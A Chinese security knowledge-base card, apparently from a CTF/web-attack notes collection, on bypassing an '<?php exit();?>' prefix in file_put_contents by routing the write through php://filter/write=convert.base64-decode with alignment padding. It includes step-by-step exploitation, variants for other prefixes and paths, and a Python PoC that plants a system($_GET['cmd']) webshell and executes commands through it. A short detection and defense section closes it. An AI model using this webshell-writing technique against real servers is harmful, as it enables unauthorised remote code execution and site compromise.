---
id: web-php-rce-put-contents-exit-prefix-base64-decode-webshell
title: 写入点被前置「<?php exit();?>」封死时，用 php://filter/write=convert.base64-decode 剥离前缀并对齐填充，让后面的 base64 载荷照常落成 PHP 代码
type: scenario
domain: web
path: web/php/rce
technique: put-contents-exit-prefix-base64-decode-webshell
tags:
- php
- file-put-contents
- php-filter
- base64-decode
- webshell
- prefix-bypass
- ctf
cve: []
severity: high
confidence: low
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W9
  verified_at: '2026-11-09T03:42:20+08:00'
  notes: 已对照原文核对；本次核对未读取图片；filename/content 双参数、file_put_contents、死亡前缀 <?php exit();?>、前缀只保留 phpexit 7 个 base64 合法字符、补 1 位对齐、php://filter/write=convert.base64-decode 等与正文一致；补位逻辑已按 PHP base64 过滤器行为本地复算（7 mod 4 = 3，补 1 位后前缀解成 6 字节垃圾），原文对补位与落盘结果的完整链只以截图呈现，故 confidence=low 保留；未访问文中 URL、未执行文内命令
url: /docs/web/php/rce/web-php-rce-put-contents-exit-prefix-base64-decode-webshell/
draft: false
kb_aliases:
- 死亡函数绕过
- exit 前缀绕过
- phpexit 对齐
- file_put_contents 写 shell 绕过 exit
- php://filter write=convert.base64-decode 写马
- 7 位对齐补 1 位
---

## 一句话结论

当 `file_put_contents` 的写入内容被强制加上 `<?php exit();?>` 之类的"死亡前缀"、后面才是攻击者可控的数据时，不要试图在 PHP 语法层面绕 `exit`，而是把**写**这一侧换成 `php://filter/write=convert.base64-decode/resource=<目标文件>`：过滤器会把前缀里不属于 Base64 字母表的字符全部丢弃，只剩 `phpexit` 这 7 个合法字符，因此只要在真正载荷前补 1 个 Base64 字符把长度凑成 8 的倍数（对齐），前缀就被降解为 6 字节无害垃圾，其后的载荷按 Base64 正常解码成 PHP 代码。

## 原理

- **写入侧过滤器的作用时机**：`file_put_contents` 的 filename 参数支持 `php://filter/write=<filters>/resource=<path>`，数据在**写往目标文件之前**先流经过滤器。因此控制写入内容之外的第三样东西——过滤器链——就能改写"最终落盘字节"，而不必修改被拼接的字符串。
- **为什么前缀会消失**：`convert.base64-decode` 在解码前会丢弃所有不在 Base64 字母表（`A-Za-z0-9+/=`）内的字符。`<?php exit();?>` 里只有 `p`、`h`、`p`、`e`、`x`、`i`、`t` 这 7 个字符合法，其余 `<`、`?`、空格、`(`、`)`、`;`、`>` 全部被丢掉，于是"致命代码"变成了字符串 `phpexit`。
- **为什么必须补 1 位**：Base64 每 4 个字符解码出 3 字节。剩下的 7 个前缀字符会让后续载荷整体错位 3 个字符（7 mod 4 = 3），解出来就是乱码；在载荷前插入 1 个 Base64 字符，使前缀部分的总长为 8（4 的倍数），前缀单独解成 6 字节垃圾，载荷从干净的分组边界开始，解码完全正确。
- **为什么 6 字节垃圾不影响执行**：这 6 字节来自 `phpexit` 加 1 个填充字符，落在 `<?php` 之前，被 PHP 当作普通输出（in-line HTML）直接打印，不参与解析；紧随其后的 `<?php ... ?>` 才是被执行的代码。
- **比"找语法绕过"更可靠**：`exit` 一旦被解析就终止脚本，靠注释符、短标签、`?>` 提前闭合等语法手段很难让写入的代码逃出前缀作用域；而过滤器是"字节级重写"，对前缀的处理是确定的。
- **前提与边界**：写入路径必须能写成 `php://filter/...`（即应用把用户输入直接当 filename 用、没有白名单/协议过滤）；目标目录可写；`convert.base64-decode` 过滤器可用（PHP 内置 filter 默认可用）。若应用对内容做了长度/关键字检查，需注意拼接后的整体仍是 Base64 字符集。

## 触发条件

- 存在 `file_put_contents(<用户可控 filename>, <固定前缀 + 用户可控内容>)` 之类的写入点，前缀含 `<?php exit();?>`、`<?php die();?>` 等阻止后续代码执行的语句。
- filename 未限制 `php://` 协议，允许 `php://filter/.../resource=...`。
- 写入目标可被 Web 访问（Web 根目录或可包含路径），使落盘文件能被解析执行。
- 攻击者能控制内容部分，且能把内容写成纯 Base64（避免混入非 Base64 字符破坏对齐）。

## 利用步骤

1. 确认写入点：请求里分别控制 `filename` 与 `content`，观察落盘文件内容是否为"`<?php exit();` + 你的内容"。
2. 把要执行的 PHP 代码（如 `<?php system($_GET[1]);?>`）整段做 Base64 编码，得到纯 Base64 载荷。
3. 数清前缀里"属于 Base64 字母表"的字符数（`<?php exit();?>` → `phpexit` → 7 个），计算需要补的字符数 `pad = (4 - 7 % 4) % 4`，本例 `pad = 1`。
4. 在 Base64 载荷最前面加 `pad` 个任意 Base64 字符（如 `a`）。
5. 把 filename 设为 `php://filter/write=convert.base64-decode/resource=<目标文件名>.php`，content 设为第 4 步的结果。
6. 访问落盘文件并执行命令验证；若输出乱码或语法错误，复核 `pad` 是否算错（常见错误是把前缀里所有字符都当合法、或漏算 `h`/`i`/`t`）。
7. 若目标目录不可写或文件名受限，换 `../` 跳出、或在已存在的可写文件（缓存、日志）上覆盖写入。

## PoC

```python
import base64, requests

payload_php = "<?php system($_GET['cmd']);?>"
b64 = base64.b64encode(payload_php.encode()).decode()

prefix_kept = "phpexit"          # "<?php exit();?>" 中属于 base64 字母表的部分
pad = (4 - len(prefix_kept) % 4) % 4   # = 1
body = "a" * pad + b64            # 补 1 位，让前缀凑成 4 的倍数

r = requests.get(target, params={
    "filename": "php://filter/write=convert.base64-decode/resource=shell.php",
    "content":  body,
})
print(r.status_code)

# 落盘结果等价于：<6 字节垃圾><?php system($_GET['cmd']);?>
r = requests.get(target + "/shell.php", params={"cmd": "id"})
print(r.text)
```

```text
解码过程自检：
  "<?php exit();?>" + "a" + b64
  --convert.base64-decode-->  丢弃 < ? ( ) ; > 空格 -->  "phpexit" + "a" + b64
  长度 8 的前缀块解成 6 字节垃圾；其余按 4 字符一组正常解码
  => 6 字节垃圾 + "<?php system($_GET['cmd']);?>"
```

## 变体与关联

- 关联：[[web-php-file-inclusion-filter-chain-file-write-webshell]]（同样是"用 `php://filter` 改写写入结果"，但那张靠 filter chain 凭空生成代码、读写同一路径；本卡是靠 `base64-decode` 把既有的致命前缀降解并对齐）、[[web-generic-file-upload-htaccess-auto-append-php-filter-base64]]（上传纯文本经 `php://filter` 的 base64 解码执行）、[[web-php-deserialization-premature-destruct-bypass]]（同为"存在阻断性 `exit/die` 时如何让后续逻辑仍被执行"，但那边是反序列化析构时机，本卡是写入字节重写）。
- 变体：前缀为 `<?php die();?>` 时合法字符变成 `phpdie`（6 个），`pad = 2`；前缀含中文/长语句时合法字符更多，按同法重算；也可用 `convert.iconv.*` 链做字节置换替代 base64 解码；写 `.htaccess`/`.user.ini` 时同样适用。
- 边界：应用若对 content 做 `preg_match` 拦 Base64 特有字符或限制长度，需要再配合长度调整；写入路径若被 `basename()` 处理掉 `php://` 前缀则完全不成立；OpenSSL/编码扩展缺失时 `convert.base64-decode` 仍可用，但 `convert.iconv.*` 可能不可用。

## 检测与防御

- 检测：请求参数中出现 `php://filter/write=`、`convert.base64-decode` 等 wrapper 链；被写入文件开头出现少量非 PHP 语法的二进制垃圾后紧跟 `<?php`；同一接口短时间内写入 `.php` 后缀文件。
- 防御：写入点的文件名与内容都不得由用户直接控制（改用服务端生成的随机名 + 扩展名白名单）；对 filename 做协议黑名单并禁用 `php://`/`phar://`/`file://`；写入内容做严格模板化（不接受任意代码）；把上传/写入目录设为不可执行（`php_admin_flag engine off`）并在网关拦截 wrapper 链关键字。
